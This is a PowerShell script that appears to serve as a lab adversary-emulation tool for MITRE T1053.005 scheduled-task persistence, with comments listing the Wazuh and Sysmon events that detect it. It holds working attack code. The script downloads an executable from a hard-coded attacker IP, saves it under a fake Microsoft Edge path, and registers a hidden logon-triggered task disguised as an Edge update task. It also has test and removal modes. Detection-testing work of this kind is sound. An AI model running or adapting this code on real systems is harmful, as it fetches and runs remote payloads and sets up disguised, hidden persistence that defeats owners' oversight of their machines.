# =============================================================================
# persist_05_task.ps1 -- Scheduled Task Persistence
# MITRE ATT&CK: T1053.005 - Scheduled Task/Job: Scheduled Task
# =============================================================================
# Wazuh Detection:
#   - Sysmon EID 1 (Process Create) for schtasks.exe
#   - Security EID 4698 (A scheduled task was created)
#   - Wazuh Rule ID: 61603 (Sysmon process creation with schtasks)
# =============================================================================
# [REQUIRES ADMINISTRATOR PRIVILEGES]
# =============================================================================

param(
    [ValidateSet("install","test","remove")]
    [string]$Action = "install"
)

# ==============================================================================
# CONFIG
# ==============================================================================
$ATTACKER_IP  = "192.168.247.139"
$PAYLOAD_URL  = "http://${ATTACKER_IP}:9090/loader_garble.exe"
$PAYLOAD_PATH = "$env:LOCALAPPDATA\Microsoft\EdgeUpdate\MicrosoftEdge.exe"

$TASK_NAME    = "Microsoft\Windows\EdgeUpdate\MicrosoftEdgeUpdateTaskCore"
$TASK_DESC    = "Keeps your Microsoft Edge software up to date."
# ==============================================================================

function Check-Admin {
    $currentPrincipal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Download-Payload {
    if (-not (Test-Path $PAYLOAD_PATH)) {
        Write-Host "[*] Downloading payload from $PAYLOAD_URL ..." -ForegroundColor Yellow
        try {
            Invoke-WebRequest -Uri $PAYLOAD_URL -OutFile $PAYLOAD_PATH -UseBasicParsing -ErrorAction Stop
            Write-Host "[+] Payload saved to: $PAYLOAD_PATH" -ForegroundColor Green
        } catch {
            Write-Warning "[!] Download failed. Creating dummy payload for testing..."
            [System.IO.File]::WriteAllText($PAYLOAD_PATH, "# dummy payload")
        }
    } else {
        Write-Host "[*] Payload already exists at: $PAYLOAD_PATH" -ForegroundColor Cyan
    }
}

function Install-Persistence {
    Write-Host "`n[*] Installing Scheduled Task persistence..." -ForegroundColor Cyan

    if (-not (Check-Admin)) {
        Write-Error "[!] This technique requires Administrator privileges. Aborting."
        return $false
    }

    Download-Payload

    # Remove existing task if present
    $existing = Get-ScheduledTask -TaskName (Split-Path $TASK_NAME -Leaf) -ErrorAction SilentlyContinue
    if ($existing) {
        Unregister-ScheduledTask -TaskName $TASK_NAME -Confirm:$false -ErrorAction SilentlyContinue
        Write-Host "[*] Removed existing task" -ForegroundColor Yellow
    }

    try {
        # Create scheduled task -- Security EID 4698 triggers here
        $action  = New-ScheduledTaskAction -Execute $PAYLOAD_PATH
        $trigger = New-ScheduledTaskTrigger -AtLogon
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

        Register-ScheduledTask `
            -TaskName $TASK_NAME `
            -Action $action `
            -Trigger $trigger `
            -Settings $settings `
            -Description $TASK_DESC `
            -Force | Out-Null

        Write-Host "[+] Scheduled Task created:" -ForegroundColor Green
        Write-Host "    Name : $TASK_NAME" -ForegroundColor Gray
        Write-Host "    Exec : $PAYLOAD_PATH" -ForegroundColor Gray
        Write-Host "    Trigger: AtLogon" -ForegroundColor Gray
        Write-Host "[+] Persistence installed. Task will run on next logon." -ForegroundColor Green
        return $true
    } catch {
        Write-Error "[!] Failed to create scheduled task: $_"
        return $false
    }
}

function Test-Persistence {
    Write-Host "`n[*] Verifying Scheduled Task persistence..." -ForegroundColor Cyan
    $ok = $true

    $task = Get-ScheduledTask -TaskName (Split-Path $TASK_NAME -Leaf) -ErrorAction SilentlyContinue
    if ($task) {
        Write-Host "[+] Task EXISTS: $TASK_NAME" -ForegroundColor Green
        Write-Host "    State  : $($task.State)" -ForegroundColor Gray
        $actions = $task.Actions
        if ($actions) {
            Write-Host "    Execute: $($actions[0].Execute)" -ForegroundColor Gray
        }
    } else {
        Write-Host "[-] Task NOT found: $TASK_NAME" -ForegroundColor Red
        $ok = $false
    }

    if (Test-Path $PAYLOAD_PATH) {
        Write-Host "[+] Payload EXISTS: $PAYLOAD_PATH" -ForegroundColor Green
    } else {
        Write-Host "[-] Payload MISSING: $PAYLOAD_PATH" -ForegroundColor Red
        $ok = $false
    }

    if ($ok) { Write-Host "[RESULT] Persistence ACTIVE v" -ForegroundColor Green }
    else      { Write-Host "[RESULT] Persistence INCOMPLETE x" -ForegroundColor Red }
    return $ok
}

function Remove-Persistence {
    Write-Host "`n[*] Removing Scheduled Task persistence..." -ForegroundColor Cyan
    try {
        Unregister-ScheduledTask -TaskName $TASK_NAME -Confirm:$false -ErrorAction Stop
        Write-Host "[+] Task removed: $TASK_NAME" -ForegroundColor Green
    } catch {
        Write-Host "[-] Task not found (already removed?)" -ForegroundColor Yellow
    }
    if (Test-Path $PAYLOAD_PATH) {
        Remove-Item -Path $PAYLOAD_PATH -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Payload removed: $PAYLOAD_PATH" -ForegroundColor Green
    } else {
        Write-Host "[-] Payload not found (already removed?)" -ForegroundColor Yellow
    }
    Write-Host "[+] Cleanup complete." -ForegroundColor Green
}

# ==============================================================================
# Main Logic
# ==============================================================================
Write-Host "============================================================" -ForegroundColor Magenta
Write-Host " persist_05_task.ps1 -- T1053.005 Scheduled Task" -ForegroundColor Magenta
Write-Host " [REQUIRES ADMINISTRATOR]" -ForegroundColor Red
Write-Host " Wazuh: Security EID 4698 / Sysmon EID 1 (schtasks)" -ForegroundColor Magenta
Write-Host "============================================================" -ForegroundColor Magenta

switch ($Action) {
    "install" { Install-Persistence }
    "test"    { Test-Persistence }
    "remove"  { Remove-Persistence }
}
